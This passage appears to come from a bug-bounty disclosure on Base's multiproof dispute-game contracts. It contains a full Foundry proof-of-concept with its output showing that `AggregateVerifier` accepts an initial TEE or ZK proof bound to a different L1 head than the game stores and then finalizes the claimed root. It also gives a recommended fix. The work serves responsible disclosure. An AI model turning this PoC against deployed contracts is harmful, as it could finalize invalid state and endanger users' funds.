Even if Base's official proposer or challenger software normally requests proofs using the game's stored `l1Head`, that off-chain behavior is not a security boundary. The vulnerable entrypoint is an on-chain public game creation function that accepts arbitrary proof bytes. The contract must enforce that the accepted initial proof is bound to the immutable game context.

This is also not merely a theoretical or unreachable code path. The vulnerable entrypoint is the public game creation flow through `DisputeGameFactory.createWithInitData()`. The reproduced multiproof activation tasks deploy and register `AggregateVerifier` as the game implementation, set the respected game type, and use `PROOF_THRESHOLD=1` in the checked activation configs. Under that configuration, a single accepted mismatched initial proof can satisfy the threshold and allow the game to resolve.

This is a mainnet-relevant bug in the Base Azul multiproof contracts. If the same `AggregateVerifier` initial proof path is activated on Base Mainnet, the bug becomes a mainnet proof-context bypass. If a specific production network had not yet activated this exact configuration at the time of review, that would be a deployment-status consideration, not a reason to classify the bug as "intended" or to claim that `l1_head` is irrelevant. The contract-level binding bug and the derivation relevance of `l1_head` remain the same and should be fixed before activation.

## References

* `AggregateVerifier.initializeWithInitData()` initial proof path:\
  `https://github.com/base/contracts/blob/v8.1.0/src/multiproof/AggregateVerifier.sol`
* `DisputeGameFactory.createWithInitData()` public game creation path:\
  `https://github.com/base/contracts/blob/v8.1.0/src/dispute/DisputeGameFactory.sol`
* `AggregateVerifier` constructor threshold bounds (`1` or `2`):\
  `https://github.com/base/contracts/blob/v8.1.0/src/multiproof/AggregateVerifier.sol`
* Sepolia multiproof activation config showing `PROOF_THRESHOLD=1`:\
  `https://github.com/base/contract-deployments/blob/e76fde63ff26d19d47a1f38a746d2b495bc60cd2/sepolia/2026-04-20-activate-multiproof/.env`
* Zeronet multiproof activation config showing `PROOF_THRESHOLD=1`:\
  `https://github.com/base/contract-deployments/blob/e76fde63ff26d19d47a1f38a746d2b495bc60cd2/zeronet/2026-04-01-activate-multiproof/.env`
* Activation scripts registering `AggregateVerifier` and setting the respected game type:\
  `https://github.com/base/contract-deployments/blob/e76fde63ff26d19d47a1f38a746d2b495bc60cd2/sepolia/2026-04-20-activate-multiproof/script/ActivateMultiproofStack.s.sol`
* Base proof contracts spec stating `verifyProposalProof()` uses the factory-captured `l1Head()` instead of re-reading a new L1 origin:\
  `https://github.com/base/base/blob/6a1333dd3f75430a4c2b378510d9aade1b507e37/docs/specs/pages/protocol/proofs/contracts.md#L312-L314`
* Base challenger spec stating `l1_head` is the L1 head hash stored in the game at creation:\
  `https://github.com/base/base/blob/6a1333dd3f75430a4c2b378510d9aade1b507e37/docs/specs/pages/protocol/proofs/challenger.md#L119-L126`
* Base proof encoder stating `verifyProposalProof()`, `challenge()`, and `nullify()` proof bytes omit `l1OriginHash`/`l1OriginNumber` because `l1Head` is already stored in CWIA:\
  `https://github.com/base/base/blob/6a1333dd3f75430a4c2b378510d9aade1b507e37/crates/proof/primitives/src/proof_encoder.rs#L88-L95`
* Base fault-proof spec stating `l1_head` determines the available L1 data view and no later L1 data is available:\
  `https://github.com/base/base/blob/6a1333dd3f75430a4c2b378510d9aade1b507e37/docs/specs/pages/protocol/fault-proof/index.md#L257-L300`
* `OracleL1ChainProvider` implementation parameterized by `l1_head` and rejecting blocks above that head:\
  `https://github.com/base/base/blob/6a1333dd3f75430a4c2b378510d9aade1b507e37/crates/proof/proof/src/l1/chain_provider.rs#L19-L52`
* Proof driver `advance_to_target()` handling `EndOfSource` by changing the requested target to the current safe head:\
  `https://github.com/base/base/blob/6a1333dd3f75430a4c2b378510d9aade1b507e37/crates/proof/driver/src/core.rs#L63-L96`
* Succinct client `advance_to_target()` with the same `EndOfSource` target adjustment:\
  `https://github.com/base/base/blob/6a1333dd3f75430a4c2b378510d9aade1b507e37/crates/proof/succinct/utils/client/src/client.rs#L62-L110`
* Succinct witness executor passing `claimed_l2_block_number` into `advance_to_target()` and then checking only output-root equality:\
  `https://github.com/base/base/blob/6a1333dd3f75430a4c2b378510d9aade1b507e37/crates/proof/succinct/utils/client/src/witness/executor.rs#L162-L183`
* ZK boot/public value construction and aggregation output committing `l1Head`:\
  `https://github.com/base/base/blob/6a1333dd3f75430a4c2b378510d9aade1b507e37/crates/proof/succinct/utils/client/src/boot.rs#L24-L43`\
  `https://github.com/base/base/blob/6a1333dd3f75430a4c2b378510d9aade1b507e37/crates/proof/succinct/programs/aggregation/src/main.rs#L54-L104`
* Nitro enclave proof journal construction deriving `l1_origin_hash` from `boot_info.l1_head`:\
  `https://github.com/base/base/blob/6a1333dd3f75430a4c2b378510d9aade1b507e37/crates/proof/tee/nitro-enclave/src/server.rs#L171-L178`
* Scope / impact definitions:\
  `https://immunefi.com/audit-competition/audit-comp-base-azul/scope/`
* Public AggregateVerifier audit:\
  `https://cantina.xyz/portfolio/b72c7078-f6da-4074-a3bd-4f938f469fb7`
* Base action harness derivation tests:\
  `https://github.com/base/base/tree/main/actions/harness/tests`
* Base derivation specification:\
  `https://github.com/base/base/blob/main/docs/specs/pages/protocol/consensus/derivation.md`

## Proof of Concept

The attached Foundry PoC demonstrates the exact vulnerable contract behavior: the initial proof path accepts a proof whose journal is bound to a different L1 head than the dispute game's stored `l1Head()`, and the game can still resolve and update `AnchorStateRegistry`.

This PoC is sufficient because the bug is not proof forgery. The bug is that `AggregateVerifier` constructs and accepts the initial proof journal using a prover-supplied L1 head instead of the game's immutable stored L1 head. The asserting verifier is used only to prove which journal the contract passes into verification.

PoC file:

```
contracts/test/multiproof/L1OriginBindingMismatch.t.sol
```

Full PoC code - save as `contracts/test/multiproof/L1OriginBindingMismatch.t.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.15;

import { Claim, GameType, Hash, Proposal } from "src/dispute/lib/Types.sol";
import { IAnchorStateRegistry } from "interfaces/dispute/IAnchorStateRegistry.sol";
import { IDelayedWETH } from "interfaces/dispute/IDelayedWETH.sol";
import { IDisputeGame } from "interfaces/dispute/IDisputeGame.sol";
import { IVerifier } from "interfaces/multiproof/IVerifier.sol";
import { console2 } from "forge-std/Test.sol";

import { AggregateVerifier } from "src/multiproof/AggregateVerifier.sol";

import { BaseTest } from "./BaseTest.t.sol";

contract JournalAssertingVerifier is IVerifier {
    bytes32 public expectedJournal;

    error UnexpectedJournal(bytes32 expected, bytes32 actual);

    function setExpectedJournal(bytes32 journal) external {
        expectedJournal = journal;
    }

    function verify(bytes calldata, bytes32, bytes32 journal) external view returns (bool) {
        if (journal != expectedJournal) revert UnexpectedJournal(expectedJournal, journal);
        return true;
    }

    function nullify() external { }
}

contract L1OriginBindingMismatch is BaseTest {
    JournalAssertingVerifier internal assertingTeeVerifier;
    JournalAssertingVerifier internal assertingZkVerifier;

    function setUp() public override {
        _deployContractsAndProxies();
        _initializeProxies();

        assertingTeeVerifier = new JournalAssertingVerifier();
        assertingZkVerifier = new JournalAssertingVerifier();

        AggregateVerifier aggregateVerifierImpl = new AggregateVerifier(
            AGGREGATE_VERIFIER_GAME_TYPE,
            IAnchorStateRegistry(address(anchorStateRegistry)),
            IDelayedWETH(payable(address(delayedWETH))),
            IVerifier(address(assertingTeeVerifier)),
            IVerifier(address(assertingZkVerifier)),
            TEE_IMAGE_HASH,
            AggregateVerifier.ZkHashes(ZK_RANGE_HASH, ZK_AGGREGATE_HASH),
            CONFIG_HASH,
            L2_CHAIN_ID,
            BLOCK_INTERVAL,
            INTERMEDIATE_BLOCK_INTERVAL,
            PROOF_THRESHOLD
        );

        factory.setImplementation(AGGREGATE_VERIFIER_GAME_TYPE, IDisputeGame(address(aggregateVerifierImpl)));
        factory.setInitBond(AGGREGATE_VERIFIER_GAME_TYPE, INIT_BOND);
        anchorStateRegistry.setRespectedGameType(AGGREGATE_VERIFIER_GAME_TYPE);
        vm.warp(block.timestamp + 1);
    }

    function _teeJournal(
        address proposer,
        bytes32 l1OriginHash,
        Proposal memory startingRoot,
        bytes32 endingRoot,
        uint256 endingBlockNumber,
        bytes memory intermediateRoots
    )
        internal
        view
        returns (bytes32)
    {
        return keccak256(
            abi.encodePacked(
                proposer,
                l1OriginHash,
                startingRoot.root.raw(),
                uint64(startingRoot.l2SequenceNumber),
                endingRoot,
                uint64(endingBlockNumber),
                intermediateRoots,
                CONFIG_HASH,
                TEE_IMAGE_HASH
            )
        );
    }

    function _zkJournal(
        address proposer,
        bytes32 l1OriginHash,
        Proposal memory startingRoot,
        bytes32 endingRoot,
        uint256 endingBlockNumber,
        bytes memory intermediateRoots
    )
        internal
        view
        returns (bytes32)
    {
        return keccak256(
            abi.encodePacked(
                proposer,
                l1OriginHash,
                startingRoot.root.raw(),
                uint64(startingRoot.l2SequenceNumber),
                endingRoot,
                uint64(endingBlockNumber),
                intermediateRoots,
                CONFIG_HASH,
                ZK_RANGE_HASH
            )
        );
    }

    function testInitialProofCanBeBoundToDifferentL1OriginThanStoredGameL1Head() public {
        vm.roll(1_000);

        uint256 staleOriginNumber = block.number - 2;
        uint256 creationParentNumber = block.number - 1;
        bytes32 staleOriginHash = keccak256("older-l1-origin-used-by-proof");
        bytes32 storedGameL1Head = keccak256("factory-parent-hash-stored-in-game");

        vm.setBlockhash(staleOriginNumber, staleOriginHash);
        vm.setBlockhash(creationParentNumber, storedGameL1Head);
        assertNotEq(staleOriginHash, storedGameL1Head);

        currentL2BlockNumber += BLOCK_INTERVAL;
        Claim rootClaim = Claim.wrap(keccak256(abi.encode(currentL2BlockNumber, "claimed-root")));

        bytes memory intermediateRoots =
            abi.encodePacked(_generateIntermediateRootsExceptLast(currentL2BlockNumber), rootClaim.raw());

        Proposal memory startingRoot = anchorStateRegistry.getStartingAnchorRoot();
        bytes32 expectedJournal = _teeJournal(
            TEE_PROVER, staleOriginHash, startingRoot, rootClaim.raw(), currentL2BlockNumber, intermediateRoots
        );
        assertingTeeVerifier.setExpectedJournal(expectedJournal);

        bytes memory proof = abi.encodePacked(
            uint8(AggregateVerifier.ProofType.TEE),
            staleOriginHash,
            staleOriginNumber,
            bytes32("signature-r"),
            bytes32("signature-s"),
            uint8(27)
        );

        AggregateVerifier game = _createAggregateVerifierGame(
            TEE_PROVER, rootClaim, currentL2BlockNumber, address(anchorStateRegistry), proof
        );

        console2.log("TEE proof-supplied L1 origin:");
        console2.logBytes32(staleOriginHash);
        console2.log("TEE game stored L1 head:");
        console2.logBytes32(game.l1Head().raw());

        assertEq(game.l1Head().raw(), storedGameL1Head);
        assertNotEq(game.l1Head().raw(), staleOriginHash);
        assertEq(game.proofCount(), 1);
        assertEq(game.teeProver(), TEE_PROVER);

        vm.warp(block.timestamp + 7 days);
        game.resolve();
        vm.warp(block.timestamp + 1);
        game.closeGame();
        (Hash anchoredRoot, uint256 anchoredBlock) = anchorStateRegistry.getAnchorRoot();
        console2.log("TEE anchored block:");
        console2.log(anchoredBlock);
        console2.log("TEE anchored root:");
        console2.logBytes32(anchoredRoot.raw());
        assertEq(anchoredRoot.raw(), rootClaim.raw());
        assertEq(anchoredBlock, currentL2BlockNumber);
    }

    function testInitialTeeProofWouldRevertIfVerifierExpectedStoredGameL1Head() public {
        vm.roll(1_000);

        uint256 staleOriginNumber = block.number - 2;
        uint256 creationParentNumber = block.number - 1;
        bytes32 staleOriginHash = keccak256("older-l1-origin-used-by-proof-negative-control");
        bytes32 storedGameL1Head = keccak256("factory-parent-hash-stored-in-game-negative-control");

        vm.setBlockhash(staleOriginNumber, staleOriginHash);
        vm.setBlockhash(creationParentNumber, storedGameL1Head);
        assertNotEq(staleOriginHash, storedGameL1Head);

        currentL2BlockNumber += BLOCK_INTERVAL;
        Claim rootClaim = Claim.wrap(keccak256(abi.encode(currentL2BlockNumber, "claimed-root-negative-control")));
        bytes memory intermediateRoots =
            abi.encodePacked(_generateIntermediateRootsExceptLast(currentL2BlockNumber), rootClaim.raw());

        Proposal memory startingRoot = anchorStateRegistry.getStartingAnchorRoot();
        bytes32 storedJournal = _teeJournal(
            TEE_PROVER, storedGameL1Head, startingRoot, rootClaim.raw(), currentL2BlockNumber, intermediateRoots
        );
        bytes32 staleJournal = _teeJournal(
            TEE_PROVER, staleOriginHash, startingRoot, rootClaim.raw(), currentL2BlockNumber, intermediateRoots
        );

        assertingTeeVerifier.setExpectedJournal(storedJournal);

        bytes memory proof = abi.encodePacked(
            uint8(AggregateVerifier.ProofType.TEE),
            staleOriginHash,
            staleOriginNumber,
            bytes32("signature-r"),
            bytes32("signature-s"),
            uint8(27)
        );

        vm.expectRevert(
            abi.encodeWithSelector(JournalAssertingVerifier.UnexpectedJournal.selector, storedJournal, staleJournal)
        );
        _createAggregateVerifierGame(TEE_PROVER, rootClaim, currentL2BlockNumber, address(anchorStateRegistry), proof);
    }

    function testInitialZkProofCanBeBoundToDifferentL1OriginThanStoredGameL1Head() public {
        vm.roll(1_000);

        uint256 staleOriginNumber = block.number - 2;
        uint256 creationParentNumber = block.number - 1;
        bytes32 staleOriginHash = keccak256("older-l1-origin-used-by-zk-proof");
        bytes32 storedGameL1Head = keccak256("factory-parent-hash-stored-in-zk-game");

        vm.setBlockhash(staleOriginNumber, staleOriginHash);
        vm.setBlockhash(creationParentNumber, storedGameL1Head);
        assertNotEq(staleOriginHash, storedGameL1Head);

        currentL2BlockNumber += BLOCK_INTERVAL;
        Claim rootClaim = Claim.wrap(keccak256(abi.encode(currentL2BlockNumber, "claimed-zk-root")));

        bytes memory intermediateRoots =
            abi.encodePacked(_generateIntermediateRootsExceptLast(currentL2BlockNumber), rootClaim.raw());

        Proposal memory startingRoot = anchorStateRegistry.getStartingAnchorRoot();
        bytes32 expectedJournal = _zkJournal(
            ZK_PROVER, staleOriginHash, startingRoot, rootClaim.raw(), currentL2BlockNumber, intermediateRoots
        );
        assertingZkVerifier.setExpectedJournal(expectedJournal);

        bytes memory proof = abi.encodePacked(
            uint8(AggregateVerifier.ProofType.ZK),
            staleOriginHash,
            staleOriginNumber,
            bytes32("zk-proof-a"),
            bytes32("zk-proof-b"),
            uint8(1)
        );

        AggregateVerifier game = _createAggregateVerifierGame(
            ZK_PROVER, rootClaim, currentL2BlockNumber, address(anchorStateRegistry), proof
        );

        console2.log("ZK proof-supplied L1 origin:");
        console2.logBytes32(staleOriginHash);
        console2.log("ZK game stored L1 head:");
        console2.logBytes32(game.l1Head().raw());

        assertEq(game.l1Head().raw(), storedGameL1Head);
        assertNotEq(game.l1Head().raw(), staleOriginHash);
        assertEq(game.proofCount(), 1);
        assertEq(game.zkProver(), ZK_PROVER);

        vm.warp(block.timestamp + 7 days);
        game.resolve();
        vm.warp(block.timestamp + 1);
        game.closeGame();
        (Hash anchoredRoot, uint256 anchoredBlock) = anchorStateRegistry.getAnchorRoot();
        console2.log("ZK anchored block:");
        console2.log(anchoredBlock);
        console2.log("ZK anchored root:");
        console2.logBytes32(anchoredRoot.raw());
        assertEq(anchoredRoot.raw(), rootClaim.raw());
        assertEq(anchoredBlock, currentL2BlockNumber);
    }

    function testInitialZkProofWouldRevertIfVerifierExpectedStoredGameL1Head() public {
        vm.roll(1_000);

        uint256 staleOriginNumber = block.number - 2;
        uint256 creationParentNumber = block.number - 1;
        bytes32 staleOriginHash = keccak256("older-l1-origin-used-by-zk-proof-negative-control");
        bytes32 storedGameL1Head = keccak256("factory-parent-hash-stored-in-zk-game-negative-control");

        vm.setBlockhash(staleOriginNumber, staleOriginHash);
        vm.setBlockhash(creationParentNumber, storedGameL1Head);
        assertNotEq(staleOriginHash, storedGameL1Head);

        currentL2BlockNumber += BLOCK_INTERVAL;
        Claim rootClaim = Claim.wrap(keccak256(abi.encode(currentL2BlockNumber, "claimed-zk-root-negative-control")));
        bytes memory intermediateRoots =
            abi.encodePacked(_generateIntermediateRootsExceptLast(currentL2BlockNumber), rootClaim.raw());

        Proposal memory startingRoot = anchorStateRegistry.getStartingAnchorRoot();
        bytes32 storedJournal = _zkJournal(
            ZK_PROVER, storedGameL1Head, startingRoot, rootClaim.raw(), currentL2BlockNumber, intermediateRoots
        );
        bytes32 staleJournal = _zkJournal(
            ZK_PROVER, staleOriginHash, startingRoot, rootClaim.raw(), currentL2BlockNumber, intermediateRoots
        );

        assertingZkVerifier.setExpectedJournal(storedJournal);

        bytes memory proof = abi.encodePacked(
            uint8(AggregateVerifier.ProofType.ZK),
            staleOriginHash,
            staleOriginNumber,
            bytes32("zk-proof-a"),
            bytes32("zk-proof-b"),
            uint8(1)
        );

        vm.expectRevert(
            abi.encodeWithSelector(JournalAssertingVerifier.UnexpectedJournal.selector, storedJournal, staleJournal)
        );
        _createAggregateVerifierGame(ZK_PROVER, rootClaim, currentL2BlockNumber, address(anchorStateRegistry), proof);
    }
}
```

What the test does:

1. It creates two different recent L1 block hashes: `staleOriginHash` as the proof-supplied L1 head, and `storedGameL1Head` as the factory-stored game L1 head.
2. It installs asserting verifier contracts that only return `true` if `AggregateVerifier` passes the exact expected journal digest.
3. It sets the expected journal to use `staleOriginHash`, not `storedGameL1Head`.
4. It creates an `AggregateVerifier` game through the normal public initialization flow with an initial TEE proof and then with an initial ZK proof.
5. It verifies that the game stores `storedGameL1Head`, not `staleOriginHash`, while still accepting the initial proof and incrementing `proofCount`.
6. It includes negative-control tests showing that the same initialization path reverts if the verifier is configured to expect a journal built from the stored game L1 head instead.
7. It calls `resolve()` and `closeGame()` and confirms that `AnchorStateRegistry` is updated to the claimed root and block number after finalization.

Relevant PoC assertions:

```solidity
assertEq(game.l1Head().raw(), storedGameL1Head);
assertNotEq(game.l1Head().raw(), staleOriginHash);
assertEq(game.proofCount(), 1);

game.resolve();
game.closeGame();

(Hash anchoredRoot, uint256 anchoredBlock) = anchorStateRegistry.getAnchorRoot();
assertEq(anchoredRoot.raw(), rootClaim.raw());
assertEq(anchoredBlock, currentL2BlockNumber);
```

Run command:

```bash
forge test --match-contract L1OriginBindingMismatch -vvvv
```

Observed passing output:

```
Ran 4 tests for test/multiproof/L1OriginBindingMismatch.t.sol:L1OriginBindingMismatch
[PASS] testInitialProofCanBeBoundToDifferentL1OriginThanStoredGameL1Head() (gas: 624681)
Logs:
  TEE proof-supplied L1 origin:
  0xdc17f718e88d5d5eebcf295141bdb62c7d17a72762f994a53145f979e30acafb
  TEE game stored L1 head:
  0xd1f72e696d487e79ff25fca229ed8bc73c7b4242a9fff8e19ea78d564719b229
  TEE anchored block:
  100
  TEE anchored root:
  0x4bcce3f760a76c230567bb5d91f247e62f720075de931d6a34af8fb29a50e06a

[PASS] testInitialTeeProofWouldRevertIfVerifierExpectedStoredGameL1Head() (gas: 361596)
[PASS] testInitialZkProofCanBeBoundToDifferentL1OriginThanStoredGameL1Head() (gas: 624220)
Logs:
  ZK proof-supplied L1 origin:
  0x42895d727a5345ddb885372d464627fa7b4e0eedf339dce4906142a79c2737f9
  ZK game stored L1 head:
  0xc39058bcfab722307b7f63edb0cf524ff5bce20e9b60db2f14deea2f35a1cd53
  ZK anchored block:
  100
  ZK anchored root:
  0x07d0eca061bb692c7a3d5c151fafbaf36c552e53f4fba7f2fea9086825cc35f8

[PASS] testInitialZkProofWouldRevertIfVerifierExpectedStoredGameL1Head() (gas: 361168)
Suite result: ok. 4 passed; 0 failed; 0 skipped
```

The PoC does not rely on forging proofs. It proves the vulnerable contract behavior directly: the initial proof journal is constructed with a proof-supplied L1 head that differs from the immutable game L1 head, yet the contract still accepts the proof, increments `proofCount`, and finalizes the game to an anchor update.

## Recommendation

Bind the initial proof verification path to the dispute game's immutable stored L1 head.

`initializeWithInitData()` should not use the proof-supplied `l1OriginHash` as the L1 head passed into `_verifyProof()`. Instead, the initial proof should be verified against `l1Head().raw()`, matching the later `verifyProposalProof()` path.

At minimum, the contract should reject any initial proof whose supplied L1 origin does not equal the stored game L1 head:

```solidity
bytes32 l1OriginHash = bytes32(proof[1:33]);
uint256 l1OriginNumber = uint256(bytes32(proof[33:65]));
_verifyL1Origin(l1OriginHash, l1OriginNumber);

if (l1OriginHash != l1Head().raw()) {
    revert InvalidL1OriginForGame(l1OriginHash, l1Head().raw());
}
```

An even safer fix is to stop using the proof-supplied L1 head as the verification context entirely and always pass `l1Head().raw()` into `_verifyProof()` during initialization, just like in `verifyProposalProof()`:

```solidity
_verifyProof(
    proof[65:],
    proofType,
    gameCreator(),
    l1Head().raw(),
    startingOutputRoot.root.raw(),
    uint64(startingOutputRoot.l2SequenceNumber),
    rootClaim().raw(),
    uint64(l2SequenceNumber()),
    intermediateOutputRoots()
);
```

Regression tests should cover both TEE and ZK initial proofs and assert that initialization reverts when the proof journal is bound to a different recent L1 head than the stored game `l1Head()`.

## Image Attachments

The submission UI only permits image attachments. The full Solidity PoC, the full Base action-harness PoC, and the full proof-client test patch are therefore included directly in this report body above.

The attached screenshots are only execution evidence for the commands and rationale described above:

* `00-report-76106-closure-rationale.png` - Project closure rationale for Report #76106, including the claim that `l1_head` is irrelevant.
* `01-foundry-l1-origin-binding-poc-4-pass.png` - Foundry `AggregateVerifier` PoC output showing 4 passing tests.
* `02-action-harness-l1-head-relevance-pass.png` - Base action-harness output showing that different L1 heads can produce different L2 safe heads.
* `03-proof-driver-end-of-source-pass.png` - Proof-driver target-binding test output.
* `04-succinct-client-target-binding-pass.png` - Succinct proof-client target-binding test output.
